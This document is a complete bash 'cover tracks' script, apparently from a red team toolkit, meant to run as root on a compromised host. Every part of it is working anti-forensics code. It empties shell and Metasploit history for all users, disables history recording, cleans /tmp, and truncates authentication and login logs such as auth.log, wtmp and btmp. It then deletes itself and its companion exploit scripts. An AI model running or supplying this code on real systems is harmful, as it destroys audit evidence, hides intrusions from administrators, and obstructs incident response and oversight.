#!/bin/bash

# =======================================================
#   IRTx Red Team - Cover Tracks Script v2
#   Author: DataTrust Red Team
#   Description: Standalone track cleaner — run this
#                if you need to clean up without running
#                the full post_exploit.sh workflow.
#   Run from: INSIDE the compromised target as root
#   Usage:  bash cover_tracks.sh (space before bash!)
# =======================================================

# --- Colours ---
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
RESET='\033[0m'

# --- Banner ---
echo -e "${RED}"
echo "   ██████╗ ██████╗ ██╗   ██╗███████╗██████╗ "
echo "  ██╔════╝██╔═══██╗██║   ██║██╔════╝██╔══██╗"
echo "  ██║     ██║   ██║██║   ██║█████╗  ██████╔╝"
echo "  ██║     ██║   ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗"
echo "  ╚██████╗╚██████╔╝ ╚████╔╝ ███████╗██║  ██║"
echo "   ╚═════╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝"
echo -e "${RED}  ████████╗██████╗  █████╗  ██████╗██╗  ██╗███████╗"
echo "  ╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔════╝"
echo "     ██║   ██████╔╝███████║██║     █████╔╝ ███████╗"
echo "     ██║   ██╔══██╗██╔══██║██║     ██╔═██╗ ╚════██║"
echo "     ██║   ██║  ██║██║  ██║╚██████╗██║  ██╗███████║"
echo -e "     ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝${RESET}"
echo -e "${CYAN}        IRTx Red Team — Cover Tracks Script v2${RESET}"
echo -e "${YELLOW}        DataTrust Security Consultants${RESET}"
echo ""

# --- OPSEC reminder ---
echo -e "${BOLD}${YELLOW}  ╔══════════════════════════════════════════════════════╗${RESET}"
echo -e "${BOLD}${YELLOW}  ║  Run this ON THE TARGET as root — not on Kali       ║${RESET}"
echo -e "${BOLD}${YELLOW}  ║  SPACE before all manual commands                   ║${RESET}"
echo -e "${BOLD}${YELLOW}  ╚══════════════════════════════════════════════════════╝${RESET}"
echo ""

# --- Root check ---
if [[ $EUID -ne 0 ]]; then
    echo -e "${RED}[!] Must be run as root. Run: su root first.${RESET}"
    exit 1
fi

# --- Confirmation ---
echo -e "${RED}[!] This will permanently clear logs and history on this system.${RESET}"
echo -e "${YELLOW}[?] Confirm all objectives and screenshots are done. Proceed? (yes/no):${RESET}"
read -r CONFIRM
if [[ "$CONFIRM" != "yes" ]]; then
    echo -e "${CYAN}[*] Aborted — no changes made.${RESET}"
    exit 0
fi
echo ""

# --- Shell history (bash + zsh, root + all users) ---
echo -e "${MAGENTA}[>] Clearing Shell History ...${RESET}"
cat /dev/null > ~/.bash_history 2>/dev/null
cat /dev/null > ~/.zsh_history 2>/dev/null
for HIST in /home/*/.bash_history /home/*/.zsh_history; do
    [ -f "$HIST" ] && cat /dev/null > "$HIST" 2>/dev/null && \
        echo -e "  ${GREEN}[+] Cleared : $HIST${RESET}"
done
export HISTFILE=/dev/null
export HISTSIZE=0
export SAVEHIST=0
echo -e "  ${GREEN}[+] Session history disabled${RESET}"
echo ""

# --- Metasploit history ---
echo -e "${MAGENTA}[>] Clearing Metasploit History ...${RESET}"
for MSF_HIST in /root/.msf4/history /home/*/.msf4/history; do
    if [ -f "$MSF_HIST" ]; then
        cat /dev/null > "$MSF_HIST" 2>/dev/null
        echo -e "  ${GREEN}[+] Cleared : $MSF_HIST${RESET}"
    fi
done
echo ""

# --- wget traces ---
echo -e "${MAGENTA}[>] Removing wget Traces ...${RESET}"
for WGET_HSTS in /root/.wget-hsts /home/*/.wget-hsts; do
    if [ -f "$WGET_HSTS" ]; then
        rm -f "$WGET_HSTS" 2>/dev/null
        echo -e "  ${GREEN}[+] Removed : $WGET_HSTS${RESET}"
    fi
done
echo ""

# --- Clean /tmp ---
echo -e "${MAGENTA}[>] Cleaning /tmp ...${RESET}"
rm -f /tmp/*.sh /tmp/*.elf /tmp/*.txt /tmp/*.rc 2>/dev/null
echo -e "  ${GREEN}[+] /tmp cleaned${RESET}"
echo ""

# --- System logs ---
echo -e "${MAGENTA}[>] Clearing System Logs ...${RESET}"
LOGS=(
    "/var/log/auth.log"
    "/var/log/auth.log.1"
    "/var/log/syslog"
    "/var/log/syslog.1"
    "/var/log/kern.log"
    "/var/log/messages"
    "/var/log/secure"
    "/var/log/faillog"
    "/var/log/dpkg.log"
    "/var/log/wtmp"
    "/var/log/btmp"
    "/var/log/lastlog"
)
for log in "${LOGS[@]}"; do
    if [ -f "$log" ]; then
        truncate -s 0 "$log" 2>/dev/null && \
            echo -e "  ${GREEN}[+] Cleared : $log${RESET}" || \
            echo -e "  ${RED}[!] Failed  : $log${RESET}"
    fi
done
echo ""

# --- Manual checklist ---
echo -e "${MAGENTA}[>] Manual Checklist — verify before disconnecting:${RESET}"
echo ""
echo -e "  ${CYAN}►${RESET} ${BOLD}[ ]${RESET} No files left behind: ${CYAN}ls -la /tmp${RESET}"
echo -e "  ${CYAN}►${RESET} ${BOLD}[ ]${RESET} No rogue processes running: ${CYAN}ps aux${RESET}"
echo -e "  ${CYAN}►${RESET} ${BOLD}[ ]${RESET} No cron jobs added: ${CYAN}crontab -l${RESET}"
echo -e "  ${CYAN}►${RESET} ${BOLD}[ ]${RESET} MSF history cleared on Kali: ${CYAN}cat /dev/null > ~/.msf4/history${RESET}"
echo ""

# --- Final summary ---
echo -e "${BOLD}${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "${BOLD}${GREEN}  Track Covering Complete!${RESET}"
echo -e "${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo -e "  ${YELLOW}Shell history :${RESET} Cleared (bash + zsh, all users)"
echo -e "  ${YELLOW}MSF history   :${RESET} Cleared"
echo -e "  ${YELLOW}wget traces   :${RESET} Removed"
echo -e "  ${YELLOW}/tmp          :${RESET} Cleaned"
echo -e "  ${YELLOW}System logs   :${RESET} Truncated"
echo -e "${BOLD}${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
echo ""
# --- Self delete ---
echo -e "${MAGENTA}[>] Self-Deleting Scripts ...${RESET}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
for SCRIPT in post_exploit.sh cover_tracks.sh eternal.sh setup.sh recon.sh; do
    if [ -f "$SCRIPT_DIR/$SCRIPT" ]; then
        rm -f "$SCRIPT_DIR/$SCRIPT" 2>/dev/null
        echo -e "  ${GREEN}[+] Deleted : $SCRIPT_DIR/$SCRIPT${RESET}"
    fi
done
echo ""

echo -e "${BOLD}${RED}  FINAL COMMAND to exit cleanly:${RESET}"
echo -e "  ${CYAN}  cat /dev/null > ~/.zsh_history; exit${RESET}"
echo -e "  ${YELLOW}  (space before cat)${RESET}"
echo ""

exit 0
